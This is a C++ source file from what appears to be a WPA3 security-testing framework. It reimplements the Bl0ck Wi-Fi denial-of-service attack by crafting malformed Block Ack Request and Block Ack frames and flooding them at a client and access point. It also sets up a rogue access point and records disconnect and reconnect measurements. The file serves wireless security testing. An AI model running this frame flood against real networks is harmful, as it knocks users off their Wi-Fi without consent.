#include "attacks/DoS_soft/bl0ck/bl0ck.h"

#include <cassert>
#include <chrono>
#include <condition_variable>
#include <fstream>
#include <memory>
#include <random>
#include <thread>
#include <nlohmann/json.hpp>

#include "default.h"
#include "attacks/components/setup_connections.h"
#include "attacks/components/sniffer_helper.h"
#include "config/RunStatus.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "logger/error_log.h"
#include "logger/log.h"
#include "observer/iperf_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

// rewrite from python https://github.com/efchatz/Bl0ck/tree/main?tab=readme-ov-file
namespace wpa3_tester::bl0ck_attack{
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;
using json = nlohmann::json;

RadioTap get_BAR_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const uint8_t fn, const uint16_t sn){
	//for some reason is dst first
	Dot11BlockAckRequest bar(ap_mac, sta_mac); //  STA(attacker) -> AP
	bar.fragment_number(fn);
	bar.start_sequence(sn);
	const vector<uint8_t> payload_data = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
	};
	const RadioTap rt{}; //FIXME valid with all adapters? fill with driver?
	return rt / bar / RawPDU(payload_data);
}

RadioTap get_BA_frame(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac){
	Dot11BlockAck ba(ap_mac, sta_mac); // STA(attacker) -> AP
	ba.fragment_number(4);             // invalid FN
	ba.start_sequence(1175);           // random invalid SSN
	ba.bar_control(0x0004);
	const vector<uint8_t> payload_data = {
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
	};
	const RadioTap rt{}; // fill with driver?
	return rt / ba / RawPDU(payload_data);
}

struct BARSContext{
	atomic<uint16_t> current_sn{0};
	atomic<uint8_t> current_fn{0};
	atomic<bool> has_sn{false};
	atomic<bool> stop{false};
};

static void bars_sniffer_thread(const HWAddress<6> &sta_mac, const string &iface, BARSContext &ctx,
								const int timeout_sec
){
	const string filter = "wlan type data subtype qos-data and wlan addr2 " + sta_mac.to_string();

	components::poll_sniffer_pdu<monostate>([&](PDU &pdu) ->optional<monostate>{
		if(ctx.stop.load()) return monostate{};

		const auto *qos = pdu.find_pdu<Dot11QoSData>();
		if(!qos) return nullopt;

		const uint16_t sn = (qos->seq_num() + 16) % 4096;
		const uint8_t fn = qos->frag_num();
		ctx.current_sn.store(sn);
		ctx.current_fn.store(fn);
		ctx.has_sn.store(true);
		log(LogLevel::DEBUG, "BARS: Updated SSN=%u FN=%u", sn, fn);
		return nullopt; // continue
	}, iface, filter, seconds(timeout_sec));
}

void block(const HWAddress<6> &sta_mac, const HWAddress<6> &ap_hw, const string &iface, const int frame_in_batch,
			const string &attack_type, const int duration_sec, const bool is_random
){
	assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");

	log(LogLevel::INFO, "Starting bl0ck exploit - Type: {}", attack_type);

	const NetworkInterface iface_obj(iface);
	PacketSender sender;

	log(LogLevel::INFO, "Sending frames - Duration: {} sec, Concurrent frames: {}", duration_sec, frame_in_batch);

	BARSContext bars_ctx;

	// ReSharper disable once CppTooWideScope // if in BARS if, join after emplace
	optional<jthread> sniffer_thread;
	if(attack_type == "BARS"){
		sniffer_thread.emplace([&]{
			bars_sniffer_thread(sta_mac, iface, bars_ctx, duration_sec);
		});
	}

	const auto start_time = steady_clock::now();
	const auto end_time = start_time + seconds(duration_sec);

	int iteration = 0;
	while(steady_clock::now() < end_time){
		try{
			const HWAddress<6> sta_hw = is_random ? hw_capabilities::rand_mac() : sta_mac;
			RadioTap block_frame;

			if(attack_type == "BAR") block_frame = get_BAR_frame(ap_hw, sta_hw);
			if(attack_type == "BA") block_frame = get_BA_frame(ap_hw, sta_hw);
			if(attack_type == "BARS") block_frame = get_BAR_frame(ap_hw, sta_hw, bars_ctx.current_fn.load(),
																bars_ctx.current_sn.load());

			log(LogLevel::DEBUG, "Sending batch {}", iteration);
			for(int i = 0; i < frame_in_batch; ++i) sender.send(block_frame, iface_obj);
			this_thread::sleep_for(100ms);
			iteration++;
		} catch(const exception &e){
			log(LogLevel::ERROR, "Error sending frame at iteration {}: {}", iteration, e.what());
			throw;
		}
	}
	log(LogLevel::INFO, "Block attack completed after {} iterations", iteration);
}

static Bl0ckResult compute_result(const RunStatus &rs){
	Bl0ckResult r{};
	if(rs.get_actor("client")->is_WB()){
		const auto disc_times = get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED", true);
		r.disconnect_count = static_cast<int>(disc_times.size());
		const auto conn_times = get_time_logs(rs, "client", "CTRL-EVENT-CONNECTED", true);
		for(const auto &disc: disc_times){
			for(const auto &conn: conn_times){
				if(conn > disc){
					r.reconnect_times_ms.push_back(
						static_cast<double>(duration_cast<milliseconds>(conn - disc).count()));
					break;
				}
			}
		}
	} else if(rs.get_actor("access_point")->is_WB()){
		r.ap_disconnected = !get_time_logs(rs, "access_point", "AP-STA-DISCONNECTED", true).empty();
	}
	//FIXME log if passed
	/*const string pass_str = r.disconnect_count > 0 ? "PASSED" : "FAILED";
	log(LogLevel::INFO, "Bl0ck result: {} — disconnects: {}", pass_str, r.disconnect_count);
	for(size_t i = 0; i < r.reconnect_times_ms.size(); ++i)
		log(LogLevel::INFO, "  reconnect[{}]: {:.0f} ms", i, r.reconnect_times_ms[i]);
	*/
	return r;
}

static Bl0ckResult load_result(const RunStatus &rs){
	const path p = rs.run_folder() / RESULT_NAME;
	ifstream f(p);
	if(!f.is_open()){
		log(LogLevel::WARNING, "result.json not found, recomputing");
		return compute_result(rs);
	}
	const json j = json::parse(f);
	Bl0ckResult r{};
	//r.passed           = j.value("passed", false);
	r.disconnect_count = j.at("disconnect_count").get<int>();
	if(j.contains("ap_disconnected") && !j.at("ap_disconnected").is_null()) r.ap_disconnected = j.at("ap_disconnected").
			get<bool>();
	r.reconnect_times_ms = j.value("reconnect_times_ms", vector<double>{});
	return r;
}

void setup_attack(RunStatus &rs){
	components::client_ap_setup_t(rs);
	components::setup_rogue_ap(rs);
}

void run_bl0ck_attack(RunStatus &rs){
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &attacker = rs.get_actor("attacker");
	const string iface = attacker.get(SK::iface);

	const string STA_mac = rs.get_actor("client").get(SK::mac);
	const string AP_mac = rs.get_actor("access_point").get(SK::mac);

	const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
	const int duration = att_cfg.at("attack_time_sec").get<int>();
	const int frame_in_batch = att_cfg.at("frame_in_batch").get<int>();
	const bool is_random = att_cfg.at("random").get<bool>();

	rs.start_observers();

	log(LogLevel::INFO, "Block Attack START (Type: {}, Frames: {})", bl0ck_att_type, frame_in_batch);
	this_thread::sleep_for(seconds(5));
	block(STA_mac, AP_mac, iface, frame_in_batch, bl0ck_att_type, duration, is_random);
	this_thread::sleep_for(seconds(5));
	log(LogLevel::INFO, "Block Attack END");

	rs.process_manager.stop_all();
	Bl0ckResult r = compute_result(rs);
	rs.save_result({
		{"disconnect_count", r.disconnect_count}, {"ap_disconnected", r.ap_disconnected},
		{"reconnect_times_ms", r.reconnect_times_ms}
	});
}

void stats_bl0ck_attack(const RunStatus &rs){
	log(LogLevel::INFO, "Bl0ck attack stats");

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, {
					{"access_point", "did not acknowledge", "ACK_fail", "red"},
					{"client", "CTRL-EVENT-DISCONNECTED", "DISCONN", "red"},
					{"client", "CTRL-EVENT-CONNECTED", "CONN", "green"}, {"client", START_tag, "START", "black"},
					{"client", END_tag, "END", "black"},
				});

	if(rs.config().at("actors").contains("rogue_ap")){
		elements.push_back(make_unique<EventLines>(get_time_logs(rs, "rogue_ap", "Captured a WPA", true), "MANA", "black"));
	}

	observer::tshark::pcap_events(rs, elements, {
									{"attacker", "wlan.fc.type_subtype == 0x000d", "ADDBA", "blue"},
									{"attacker", "wlan.fixed.action_code == 0x02", "DELBA", "blue"},
									{
										"attacker",
										"(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)", "BAR_fn4",
										"cyan"
									},
									{
										"attacker",
										"(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)", "BA_fn4",
										"purple"
									},
								});

	const path attacker_graph = observer::tshark::tshark_graph(rs, "attacker", elements);
	const path client_graph = observer::tshark::tshark_graph(rs, "client", elements);

	const Bl0ckResult result = load_result(rs);
	generate_report(rs, result, attacker_graph, client_graph);

	log(LogLevel::INFO, "Bl0ck attack stats done");
}
}
